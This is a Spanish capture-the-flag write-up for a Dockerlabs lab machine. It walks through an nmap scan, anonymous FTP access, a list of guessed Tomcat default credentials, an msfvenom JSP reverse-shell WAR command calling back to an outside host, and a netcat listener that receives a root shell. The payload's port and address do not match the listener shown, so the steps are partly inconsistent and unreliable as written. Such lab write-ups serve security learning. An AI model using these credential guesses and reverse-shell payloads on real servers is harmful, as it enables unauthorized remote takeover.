# Máquina -Pn

------------

## Reconocimiento 

Comenzamos realizando un escaneo con **nmap** para comprobar los puertos abiertos y sus respectivas versiones de la máquina objetivo.


```shell
# Nmap 7.94SVN scan initiated Wed Jun 19 14:28:31 2024 as: nmap -p- -sC -sV -sS --min-rate 5000 -n -Pn -oN nmap 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
8080/tcp open  http    Apache Tomcat 9.0.88
|_http-title: Apache Tomcat/9.0.88
|_http-favicon: Apache Tomcat
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 19 14:28:38 2024 -- 1 IP address (1 host up) scanned in 7.61 seconds
```

El escaneo muestra abierto el puerto 21 (ftp) y el puerto 8080 (http). Como permite acceder al puerto 21 realizamos una conexión ftp y obtenemos el siguiente texto.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/pn]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:miguel): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34548|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
226 Directory send OK.
ftp> 
```
Obtenemos el fichero **tomcat.txt** y lo imprimimos, mostrando lo siguiente.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/pn]
└─$ cat tomcat.txt 
Hello tomcat, can you configure the tomcat server? I lost the password...
```
Por lo que procedemos a investigar la página web en el puerto 8080.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/ebb55f93-3079-49cd-b74a-d34f7419d8e6)

## Explotación

Tras investigar, decidimos tratar de acceder a la direccion /manager que nos solicita una contraseña.
Asi que probamos las siguientes credenciales para la web tomcat, en espera de que funcione alguna.

```shell
admin:admin

tomcat:tomcat

admin:

admin:s3cr3t

tomcat:s3cr3t

admin:tomcat
```

Finalmente, podemos acceder con **tomcat:s3cr3t**.

Ahora, como podemos subir un archivo **.war** realizamos una reverse shell.
Investigando, encontramos la manera de crear la conexión a través de **msfvenom** y creamos el payload.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/pn]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.123 LPORT=3155 -f war > RevShell.war
```
Subimos el archivo a la páquina web.

![image](https://github.com/miiguelpalaces/Machine-Upload-Dockerlabs-/assets/129620259/54a5ab97-9bad-4e1c-a83d-ddc59db41692)

Escuchamos por el puerto 5555 y obtenemos acceso directamente a la máquina.
Al tratar de ver que usuario somos, vemos que hemos accedido directamente con el usuario **root**.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/pn]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 58516
whoami
root
```




